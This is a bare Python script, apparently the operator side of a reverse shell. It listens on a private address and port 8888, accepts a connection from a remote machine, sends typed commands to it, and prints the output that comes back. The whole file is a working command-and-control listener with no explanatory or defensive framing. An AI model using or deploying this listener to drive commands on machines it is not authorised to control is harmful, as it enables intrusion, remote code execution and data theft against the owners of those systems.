import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('192.168.215.121', 8888))
s.listen(5)
client, addr = s.accept()
while 1:
  command = str(input('Enter command:'))
  client.send(command.encode())
  if command.lower() == 'exit':
    break
  result_output = client.recv(1024).decode()
  print(result_output)
client.close()
s.close()